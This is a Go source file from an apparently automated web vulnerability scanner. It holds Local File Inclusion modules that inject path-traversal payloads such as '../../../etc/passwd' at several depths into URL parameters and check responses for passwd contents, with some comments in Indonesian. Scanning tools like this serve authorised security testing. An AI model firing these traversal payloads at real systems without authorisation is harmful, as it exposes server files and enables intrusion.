package modules

import (
	"io"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"

	"autohunt/internal/core"
)

// LFIBasicModule (legacy) - kept for backward compatibility if needed.
// This version performs a simple, direct LFI check against a fixed parameter
// on the base target. The new context-based module below is preferred.
type LFIBasicModule struct {
	client  *http.Client
	payload string
	param   string
}

func NewLFIBasicModule() *LFIBasicModule {
	return &LFIBasicModule{
		client: &http.Client{
			Timeout: 8 * time.Second,
		},
		// Classic, easily detectable Linux passwd path for quick LFI signal.
		payload: "../../../../../../etc/passwd",
		param:   "file",
	}
}

func (m *LFIBasicModule) Name() string {
	return "LFIBasic"
}

func (m *LFIBasicModule) Run(targets []core.Target) ([]core.Finding, error) {
	var findings []core.Finding

	for _, t := range targets {
		testURL, ok := buildLFIURL(t.URL, m.param, m.payload)
		if !ok {
			continue
		}

		body, err := httpGetBody(m.client, testURL)
		if err != nil || body == "" {
			continue
		}

		if isEtcPasswd(body) {
			findings = append(findings, core.Finding{
				Target:     t.URL,
				Endpoint:   testURL,
				Module:     m.Name(),
				Type:       "Local File Inclusion (/etc/passwd)",
				Severity:   "Critical",
				Confidence: 0.98,
				Evidence:   "Found /etc/passwd pattern in response body",
				Tags:       []string{"lfi", "file-disclosure"},
			})
		}
	}

	return findings, nil
}

// LFIBasicContextModule - fullpower, ScanContext-based LFI detector.
//
// Menggunakan intelligence dari ScanContext untuk fokus pada parameter yang relevan:
// - ctx.Buckets.LFI: hasil klasifikasi parameter (gf-style) dari FullRecon
// - ctx.LiveURLs: sebagai fallback jika bucket kosong
//
// Strategi:
// - Untuk setiap (URL, param) di bucket LFI:
//   - Inject payload path traversal menuju /etc/passwd
//   - Cek pola /etc/passwd dalam response
//
// - Fallback:
//   - Jika bucket kosong, gunakan LiveURLs dan coba param kandidat umum (file/path/page)
//
// - Aman & non-destructive:
//   - Hanya GET dengan payload baca file umum, tidak mengubah state server.
type LFIBasicContextModule struct {
	client   *http.Client
	payloads []string
	params   []string
}

func NewLFIBasicContextModule() *LFIBasicContextModule {
	return &LFIBasicContextModule{
		client: &http.Client{
			Timeout: 8 * time.Second,
		},
		// Multiple traversal depths untuk meningkatkan peluang hit
		payloads: []string{
			"../../../../../../etc/passwd",
			"../../../../../etc/passwd",
			"../../../../etc/passwd",
			"../../../etc/passwd",
			"../../etc/passwd",
			"../etc/passwd",
		},
		// Generic param candidates jika tidak ada bucket
		params: []string{"file", "path", "page", "include", "template", "view"},
	}
}

func (m *LFIBasicContextModule) Name() string {
	return "LFIBasic"
}

func (m *LFIBasicContextModule) Run(ctx *core.ScanContext) ([]core.Finding, error) {
	if ctx == nil {
		return nil, nil
	}

	var findings []core.Finding
	concurrency := ctx.GetConcurrency()
	if concurrency < 1 {
		concurrency = 1
	}

	type job struct {
		Target  string
		URL     string
		Param   string
		Payload string
	}

	jobs := make(chan job, 1024)
	results := make(chan core.Finding, 1024)

	var wg sync.WaitGroup
	var seenMu sync.Mutex
	seen := make(map[string]struct{})

	// Worker pool dengan sinkronisasi yang benar:
	for i := 0; i < concurrency; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for j := range jobs {
				testURL, ok := buildLFIURL(j.URL, j.Param, j.Payload)
				if !ok {
					continue
				}

				// Hindari duplikat request yang sama (dilindungi mutex)
				key := j.Target + "|" + testURL
				seenMu.Lock()
				if _, exists := seen[key]; exists {
					seenMu.Unlock()
					continue
				}
				seen[key] = struct{}{}
				seenMu.Unlock()

				body, err := httpGetBody(m.client, testURL)
				if err != nil || body == "" {
					continue
				}

				if isEtcPasswd(body) {
					results <- core.Finding{
						Target:     j.Target,
						Endpoint:   testURL,
						Module:     m.Name(),
						Type:       "Local File Inclusion (/etc/passwd)",
						Severity:   "Critical",
						Confidence: 0.98,
						Evidence:   "Found /etc/passwd pattern in response body",
						Tags:       []string{"lfi", "file-disclosure", "bucket:lfi"},
					}
				}
			}
		}()
	}

	// 1) Gunakan bucket LFI jika tersedia
	if len(ctx.Buckets.LFI) > 0 {
		for _, ep := range ctx.Buckets.LFI {
			target := deriveTargetForURL(ctx, ep.URL)
			for _, payload := range m.payloads {
				jobs <- job{
					Target:  target,
					URL:     ep.URL,
					Param:   ep.Param,
					Payload: payload,
				}
			}
		}
	}

	// 2) Fallback: jika tidak ada bucket, gunakan LiveURLs + param generic
	if len(ctx.Buckets.LFI) == 0 && len(ctx.LiveURLs) > 0 {
		for _, raw := range ctx.LiveURLs {
			target := deriveTargetForURL(ctx, raw)
			for _, p := range m.params {
				for _, payload := range m.payloads {
					jobs <- job{
						Target:  target,
						URL:     raw,
						Param:   p,
						Payload: payload,
					}
				}
			}
		}
	}

	// Tutup jobs setelah semua dikirim
	close(jobs)

	// Tunggu semua worker selesai lalu tutup results
	go func() {
		wg.Wait()
		close(results)
	}()

	// Kumpulkan semua findings dari channel results
	for f := range results {
		findings = append(findings, f)
	}

	return findings, nil
}

// buildLFIURL menyusun URL dengan parameter LFI + payload traversal.
func buildLFIURL(rawURL, param, payload string) (string, bool) {
	u, err := url.Parse(rawURL)
	if err != nil {
		return "", false
	}

	q := u.Query()
	q.Set(param, payload)
	u.RawQuery = q.Encode()

	return u.String(), true
}

// httpGetBody utilitas sederhana untuk GET + baca body.
func httpGetBody(client *http.Client, u string) (string, error) {
	resp, err := client.Get(u)
	if err != nil {
		return "", err
	}
	if resp.Body == nil {
		return "", nil
	}
	defer resp.Body.Close()

	data, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	return string(data), nil
}

// isEtcPasswd mendeteksi pola khas /etc/passwd pada body.
func isEtcPasswd(body string) bool {
	if body == "" {
		return false
	}
	lower := strings.ToLower(body)
	return strings.Contains(lower, "root:x:0:0:") && strings.Contains(lower, "/bin/")
}

// deriveTargetForURL mencoba memetakan URL ke base target dari ScanContext.
// Helper ini sudah tersedia di modul lain (misalnya XSS/SQLi) dan tidak perlu
// didefinisikan ulang di sini untuk menghindari duplikasi.
